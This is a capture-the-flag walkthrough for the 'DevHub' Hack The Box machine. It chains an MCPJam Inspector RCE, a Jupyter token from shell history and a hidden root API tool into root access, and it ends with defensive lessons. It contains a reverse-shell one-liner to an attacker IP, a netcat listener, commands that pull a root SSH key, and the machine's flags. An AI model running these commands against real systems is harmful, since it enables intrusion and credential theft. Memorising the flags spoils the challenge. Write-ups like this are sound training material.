# DevHub — HTB CTF Walkthrough

**Difficulty:** Medium  
**OS:** Linux (Ubuntu 22.04)  
**User Flag:** `52eb6bf7dc05a96c5003f5bf2bbdff72`  
**Root Flag:** `b357d6f2b1c5da98fe62f510612022d5`

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```bash
nmap -sC -sV 10.129.17.210 -o devhub.nmap
```

**Open Ports:**

| Port | Service | Detail |
|------|---------|--------|
| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu |
| 80/tcp | HTTP | nginx 1.18.0 |

The HTTP service on port 80 immediately redirects to `http://devhub.htb/`, indicating virtual host routing is in use.

### 1.2 Add Virtual Host Entry

```bash
echo "10.129.17.210 devhub.htb" | sudo tee -a /etc/hosts
```

### 1.3 Web Enumeration

Visiting `http://devhub.htb/` reveals the DevHub platform. Technology fingerprinting with Wappalyzer or `whatweb` identifies the underlying stack. Further port scanning or directory enumeration uncovers the MCPJam Inspector service running on port **6274**.

```bash
# Full port scan to find non-standard ports
nmap -p- --min-rate 5000 10.129.17.210
```

Port 6274 runs the **MCPJam Inspector v1.4.2** — a tool for developing and debugging Model Context Protocol (MCP) servers.

---

## 2. Initial Foothold — CVE-2026-23744

### 2.1 Vulnerability Overview

**CVE-2026-23744** is a critical unauthenticated Remote Code Execution vulnerability affecting MCPJam Inspector versions 1.4.2 and earlier.

The root cause is twofold:
- The inspector binds to `0.0.0.0` by default instead of `127.0.0.1`, exposing it externally
- An API endpoint accepts a `serverConfig` JSON payload that directly spawns a process using a caller-controlled `command` and `args` array, with no authentication required

An attacker can craft a malicious `serverConfig` with a base64-encoded reverse shell embedded in the command arguments. When the inspector processes the configuration, it executes the command on the host, yielding code execution as the service user.

### 2.2 Exploit

Set up a listener on your attack machine:

```bash
nc -lvnp 4444
```

Run the public PoC against the target:

```bash
python3 CVE-2026-23744.py http://devhub.htb:6274 "sh -i >& /dev/tcp/10.10.17.90/4444 0>&1"
```

**Result:** Reverse shell received as `mcp-dev`.

```
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

---

## 3. Post-Exploitation Enumeration

### 3.1 Basic Situational Awareness

```bash
id
# uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)

cat /etc/passwd | grep -v nologin | grep -v false
# root, mcp-dev, analyst — three interactive users

ls /home/
# analyst  mcp-dev
```

No user flag in `/home/mcp-dev/` — it likely belongs to `analyst`.

### 3.2 Internal Services Discovery

```bash
ss -tlnp
```

Key findings:

| Address | Port | Service |
|---------|------|---------|
| 0.0.0.0 | 6274 | MCPJam Inspector |
| 127.0.0.1 | 5000 | OPSMCP Flask API |
| 127.0.0.1 | 8888 | Jupyter Notebook |

Two internal services not exposed externally: **OPSMCP** on 5000 and **Jupyter** on 8888.

### 3.3 OPSMCP Probe

```bash
curl -s http://127.0.0.1:5000/
```

```json
{
  "auth": "Required - X-API-Key header",
  "endpoints": ["/tools/list", "/tools/call", "/health"],
  "server": "OPSMCP",
  "status": "operational",
  "version": "2.1.0"
}
```

OPSMCP is an authenticated MCP-style operations API. The API key is unknown at this stage.

### 3.4 Jupyter Notebook Discovery

```bash
curl -sv http://127.0.0.1:8888/ 2>&1 | head -10
# TornadoServer/6.5.4 — confirms Jupyter
```

Checking `.bash_history` reveals a Jupyter token that was used during previous sessions:

```
Token: a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Confirm access:

```bash
curl -s "http://localhost:8888/api/contents" \
  -H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
```

This returns a directory listing containing `quarterly_analysis.ipynb`, which is **writable**.

### 3.5 Systemd Service Analysis

```bash
cat /etc/systemd/system/opsmcp.service
```

```ini
[Service]
User=root
WorkingDirectory=/opt/opsmcp
Environment=PATH=/home/analyst/jupyter-env/bin:/usr/local/bin:/usr/bin:/bin
ExecStart=/home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

Critical finding: **OPSMCP runs as root** and uses `analyst`'s Python virtualenv. The source file `/opt/opsmcp/server.py` is owned by `analyst` and not readable by `mcp-dev`.

```bash
cat /etc/systemd/system/jupyter.service   # Jupyter runs as analyst
```

The attack path is clear: **Jupyter (as analyst) → read server.py → get API key → call hidden OPSMCP tool as root → root SSH key**.

---

## 4. Lateral Movement — Code Execution via Jupyter WebSocket

### 4.1 Overwrite the Notebook with a Malicious Payload

Since `quarterly_analysis.ipynb` is writable via the Jupyter API, replace its content with code to read `server.py`:

```bash
curl -s -X PUT "http://localhost:8888/api/contents/quarterly_analysis.ipynb" \
  -H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "notebook",
    "content": {
      "nbformat": 4,
      "nbformat_minor": 4,
      "metadata": {"kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"}},
      "cells": [{
        "cell_type": "code",
        "metadata": {},
        "outputs": [],
        "execution_count": null,
        "source": "import subprocess; print(subprocess.check_output([\"cat\",\"/opt/opsmcp/server.py\"]).decode())"
      }]
    }
  }'
```

### 4.2 Create a Jupyter Session and Kernel

```bash
SESSION=$(curl -s -X POST "http://localhost:8888/api/sessions" \
  -H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
  -H "Content-Type: application/json" \
  -d '{
    "path": "quarterly_analysis.ipynb",
    "type": "notebook",
    "name": "quarterly_analysis.ipynb",
    "kernel": {"name": "python3"}
  }')

echo $SESSION | python3 -c "import sys,json; d=json.load(sys.stdin); print('Kernel:', d['kernel']['id'])"
```

### 4.3 Execute via WebSocket (Jupyter Kernel Protocol)

Jupyter kernels communicate over WebSocket using the Jupyter messaging protocol. Since no external WebSocket library is available, we implement the protocol manually using Python's built-in `socket` module:

```python
import socket, json, uuid, base64

TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
KERNEL = "<kernel-id-from-above>"
CODE = "import subprocess; print(subprocess.check_output(['cat','/opt/opsmcp/server.py']).decode())"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("127.0.0.1", 8888))

key = base64.b64encode(b"A" * 16).decode()
handshake = "\r\n".join([
    f"GET /api/kernels/{KERNEL}/channels HTTP/1.1",
    "Host: 127.0.0.1:8888",
    "Upgrade: websocket",
    "Connection: Upgrade",
    f"Sec-WebSocket-Key: {key}",
    "Sec-WebSocket-Version: 13",
    f"Authorization: token {TOKEN}",
    "", ""
]).encode()

sock.send(handshake)
# ... (send execute_request message, parse stream/execute_result frames)
```

The kernel executes the code as `analyst` and returns the full contents of `/opt/opsmcp/server.py` in a `stream` message.

---

## 5. OPSMCP Source Analysis

The returned `server.py` reveals:

**Hardcoded API key:**
```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

**Visible tools** (returned by `/tools/list`): `ops.system_status`, `ops.list_services`, `ops.check_disk`, `ops.view_logs`

**Hidden tools** (not listed but callable):
```python
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {...}
}
```

The `ops._admin_dump` tool with `target=ssh_keys` reads `/root/.ssh/id_rsa` — and since OPSMCP runs as root, this is a direct path to the root private key.

---

## 6. Privilege Escalation — OPSMCP Hidden Tool Abuse

### 6.1 Call the Hidden Admin Dump Tool

```bash
curl -s -X POST "http://127.0.0.1:5000/tools/call" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
```

**Response:**
```json
{
  "target": "ssh_keys",
  "root_private_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n...",
  "note": "Emergency recovery key dump"
}
```

### 6.2 SSH as Root

Save the key and connect:

```bash
cat > root_id_rsa << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
<key data>
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 root_id_rsa
ssh -i root_id_rsa root@10.129.17.210
```

```
root@devhub:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### 6.3 Capture the Flags

```bash
cat /root/root.txt
# b357d6f2b1c5da98fe62f510612022d5

cat /home/analyst/user.txt
# 52eb6bf7dc05a96c5003f5bf2bbdff72
```

---

## 7. Attack Chain Summary

```
Nmap → nginx:80 (devhub.htb) + port scan → MCPJam Inspector on :6274
         ↓
CVE-2026-23744 (unauthenticated RCE via serverConfig) → shell as mcp-dev
         ↓
ss -tlnp → Jupyter on 127.0.0.1:8888 + OPSMCP on 127.0.0.1:5000
         ↓
.bash_history → Jupyter token discovered
         ↓
Writable notebook → overwrite with malicious cell
         ↓
Jupyter WebSocket kernel execution as analyst
         ↓
Read /opt/opsmcp/server.py → hardcoded API key + hidden tool discovered
         ↓
ops._admin_dump (target=ssh_keys, confirm=true) → /root/.ssh/id_rsa
         ↓
SSH as root → both flags captured
```

---

## 8. Key Takeaways

**CVE-2026-23744 (MCPJam Inspector RCE):** Binding a development/debugging tool to `0.0.0.0` without authentication is a critical misconfiguration. Inspector-style tools that spawn processes from user-supplied configuration should never be exposed to untrusted networks.

**Jupyter Notebook token in shell history:** Tokens and credentials written to the terminal end up in `.bash_history`. History files should be treated as sensitive and regularly reviewed. Jupyter should use proper authentication and bind only to localhost.

**Hardcoded credentials in source code:** The OPSMCP API key and the hidden tool's functionality were embedded directly in `server.py`. Secrets should be loaded from environment variables or a secrets manager, never hardcoded.

**Hidden but callable API endpoints:** Security through obscurity is not security. The `ops._admin_dump` tool was intentionally omitted from `/tools/list` but remained fully callable. Sensitive operations must be protected by proper authorization logic, not just by hiding them from listings.

**Root service with credential dump capability:** Running a web API as root that can read `/root/.ssh/id_rsa` on demand is equivalent to an unauthenticated root shell for anyone who obtains the API key. Services should run as unprivileged users with the minimum permissions required.
